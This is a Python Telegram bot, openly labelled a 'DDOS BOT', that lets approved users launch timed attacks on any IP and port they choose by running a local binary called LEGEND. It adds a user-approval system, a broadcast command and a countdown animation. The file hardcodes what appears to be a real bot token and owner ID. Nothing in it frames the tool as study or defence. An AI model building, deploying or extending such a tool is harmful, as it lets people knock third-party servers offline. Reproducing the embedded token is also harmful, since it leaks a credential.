import telebot
import subprocess
import shlex
import time
import random
import html
from telebot import types
import threading

# Using your provided Telegram bot token and owner ID
TELEGRAM_TOKEN = '7686606251:AAHYYNhgtWrXQ5gprlfOt76mttiA4VzQu70'
OWNER_ID = '1604629264'

bot = telebot.TeleBot(TELEGRAM_TOKEN)
approved_users = set()

# List of blocked ports (e.g., commonly misused or restricted)
BLOCKED_PORTS = {22, 23, 25, 53, 80, 443, 3306, 8080, 8700, 20000, 443, 17500, 9031, 20002, 20001}

# Stylish Welcome Messages
start_replies = [
    "🚀 <b>Welcome, Commander!</b>\n\nType /help to see available commands.",
    "🌟 <b>Welcome to the Control Center!</b>\n\nUse /help to explore features.",
    "🤖 <b>DDOS BOT Ready!</b>\n\nType /help for a list of commands."
]

# Predefined Error and Success Messages
error_messages = [
    "😱 <b>Error!</b> Something went wrong.",
    "🚨 <b>Oops!</b> Unexpected error occurred."
]
success_messages = [
    "✅ <b>Success!</b> Command executed.",
    "🚀 <b>All systems go!</b> Task completed!"
]

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, random.choice(start_replies), parse_mode="HTML")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "📌 <b>Available Commands:</b>\n"
        "⚡ /start - Welcome message\n"
        "📜 /help - Show this menu\n"
        "💥 /attack <code>IP PORT</code> - Start attack\n"
        "🛑 /status - Check server status\n"
        "🔄 /ping - Check bot latency\n"
        "✅ /approve <code>user_id</code> - Approve a user (owner only)\n"
        "🚫 /unapprove <code>user_id</code> - Remove user (owner only)\n"
        "📢 /broadcast <code>message</code> - Send a message to all approved users\n"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🌍 Website", url="https://yourwebsite.com"))
    markup.add(types.InlineKeyboardButton("📞 Contact Support", url="https://t.me/yourchannel"))
    bot.reply_to(message, help_text, parse_mode="HTML", reply_markup=markup)

@bot.message_handler(commands=['status'])
def status(message):
    bot.reply_to(message, "✅ <b>Server is running smoothly.</b>\nNo active issues detected.", parse_mode="HTML")

@bot.message_handler(commands=['ping'])
def ping(message):
    start_time = time.time()
    sent_msg = bot.reply_to(message, "🏓 <b>Pinging...</b>", parse_mode="HTML")
    latency = (time.time() - start_time) * 1000
    bot.edit_message_text(f"🏓 <b>Pong!</b> Response Time: <code>{int(latency)}ms</code>", 
                          message.chat.id, sent_msg.message_id, parse_mode="HTML")

@bot.message_handler(commands=['approve'])
def approve(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "🚫 <b>Unauthorized Access</b>", parse_mode="HTML")
        return
    try:
        user_id = message.text.split()[1]
        approved_users.add(user_id)
        bot.reply_to(message, f"✅ <b>User {user_id} Approved!</b>", parse_mode="HTML")
    except IndexError:
        bot.reply_to(message, "💡 <b>Usage:</b> /approve <code>user_id</code>", parse_mode="HTML")

@bot.message_handler(commands=['unapprove'])
def unapprove(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "🚫 <b>Unauthorized Access</b>", parse_mode="HTML")
        return
    try:
        user_id = message.text.split()[1]
        if user_id in approved_users:
            approved_users.remove(user_id)
            bot.reply_to(message, f"🚫 <b>User {user_id} Removed</b>", parse_mode="HTML")
        else:
            bot.reply_to(message, f"ℹ️ <b>User {user_id} Not Found</b>", parse_mode="HTML")
    except IndexError:
        bot.reply_to(message, "💡 <b>Usage:</b> /unapprove <code>user_id</code>", parse_mode="HTML")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "🚫 <b>Unauthorized Access</b>", parse_mode="HTML")
        return
    try:
        broadcast_text = message.text.split(" ", 1)[1]
        for user in approved_users:
            bot.send_message(user, f"📢 <b>Broadcast:</b> {broadcast_text}", parse_mode="HTML")
        bot.reply_to(message, "✅ <b>Broadcast sent!</b>", parse_mode="HTML")
    except IndexError:
        bot.reply_to(message, "💡 <b>Usage:</b> /broadcast <code>message</code>", parse_mode="HTML")

# /attack - Display Inline Buttons for Duration Selection
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = str(message.from_user.id)
    if user_id not in approved_users:
        bot.reply_to(message, "🚷 <b>Unauthorized Access!</b>", parse_mode="HTML")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "💡 <b>Usage:</b> /attack <code>IP PORT</code>", parse_mode="HTML")
        return

    ip, port = args[1], args[2]
    
        # Check if the port is in the blocked list
    if int(port) in BLOCKED_PORTS:
        bot.reply_to(message, f"🚫 <b>Attack blocked!</b> Port {port} is restricted.", parse_mode="HTML")
        return
    
    markup = types.InlineKeyboardMarkup()
    durations = [300, 240, 180, 120]
    for duration in durations:
        markup.add(types.InlineKeyboardButton(f"⏳ {duration} sec", callback_data=f"attack:{ip}:{port}:{duration}"))
    bot.reply_to(message, f"⏳ <b>Select Attack Duration</b>\n🔹 Target: <code>{html.escape(ip)}</code>\n🔹 Port: <code>{html.escape(port)}</code>", 
                 parse_mode="HTML", reply_markup=markup)

# Callback: Duration Selected → Ask for Confirmation
@bot.callback_query_handler(func=lambda call: call.data.startswith("attack:"))
def attack_duration_selected(call):
    try:
        _, ip, port, duration = call.data.split(":")
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_attack:{ip}:{port}:{duration}"))
        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack"))
        bot.edit_message_text(f"⚠️ <b>Confirm Attack?</b>\n🔹 Target: <code>{html.escape(ip)}</code>\n🔹 Port: <code>{html.escape(port)}</code>\n🔹 Duration: <code>{duration} sec</code>",
                              call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
    except Exception as e:
        bot.send_message(call.message.chat.id, f"{random.choice(error_messages)}\n💥 An error occurred: {html.escape(str(e))}", parse_mode="HTML")

# Callback: Confirm Attack → Animate and Execute the Binary
@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_attack:"))
def confirm_attack(call):
    try:
        _, ip, port, duration = call.data.split(":")
        chat_id = call.message.chat.id

        # Step 1: Initial Launch Message
        bot.send_message(chat_id, f"🔥 <b>Launching Attack...</b>\n🔹 Target: <code>{html.escape(ip)}</code>\n🔹 Port: <code>{html.escape(port)}</code>\n🔹 Duration: <code>{duration} sec</code>", parse_mode="HTML")
        
        # Step 2: Simulate an Animated Sequence
        animation_frames = ["🔄 Connecting", "🚀 Launching", "🔥 Attacking", "💥 Impact", "✅ Running..."]
        for i, frame in enumerate(animation_frames, start=1):
            progress_bar = "█" * i + "▒" * (len(animation_frames) - i)
            bot.send_message(chat_id, f"{frame} [{progress_bar}]", parse_mode="HTML")
            time.sleep(1)
        
        # Step 3: Countdown Timer Animation
        countdown_message = bot.send_message(chat_id, f"⚡ Attack in progress... <b>{duration}s remaining</b> ⏳", parse_mode="HTML")
        for sec in range(int(duration), 0, -1):
            try:
                bot.edit_message_text(f"⚡ Attack in progress... <b>{sec}s remaining</b> ⏳", chat_id, countdown_message.message_id, parse_mode="HTML")
            except Exception as e:
                print(e)
            time.sleep(1)
        
        # Step 4: Execute the Binary Command
        command = f"./LEGEND {ip} {port} {duration}"
        try:
            result = subprocess.run(shlex.split(command), check=True, capture_output=True, text=True)
            output = html.escape(result.stdout)
            bot.send_message(chat_id, f"{random.choice(success_messages)}\nExecuted Command: <code>{html.escape(command)}</code>\nOutput:\n<pre>{output}</pre>", parse_mode="HTML")
        except subprocess.CalledProcessError as e:
            error_output = html.escape(e.stderr)
            bot.send_message(chat_id, f"❌ <b>Error Executing Binary!</b>\nCommand: <code>{html.escape(command)}</code>\nError Output:\n<pre>{error_output}</pre>", parse_mode="HTML")
        
        # Step 5: Final Message
        bot.send_message(chat_id, "✅ <b>Attack Finished!</b> 💥\nTarget Neutralized.", parse_mode="HTML")
    except Exception as e:
        bot.send_message(chat_id, f"{random.choice(error_messages)}\n💥 An error occurred: {html.escape(str(e))}", parse_mode="HTML")

# Callback: Cancel the Attack
@bot.callback_query_handler(func=lambda call: call.data == "cancel_attack")
def cancel_attack(call):
    bot.edit_message_text("❌ <b>Attack Canceled</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")


# Function to print messages every 60 seconds
def periodic_print():
    messages = [
        "🌀 Bot is running smoothly...",
        "💡 Remember to check logs for errors!",
        "🚀 Your bot is alive and responding!",
        "⚡ Keep an eye on performance metrics!"
    ]
    while True:
        print(random.choice(messages))
        time.sleep(60)

# Start the periodic print function in a separate thread
threading.Thread(target=periodic_print, daemon=True).start()

print("Bot Is Running 🎉")
bot.infinity_polling()
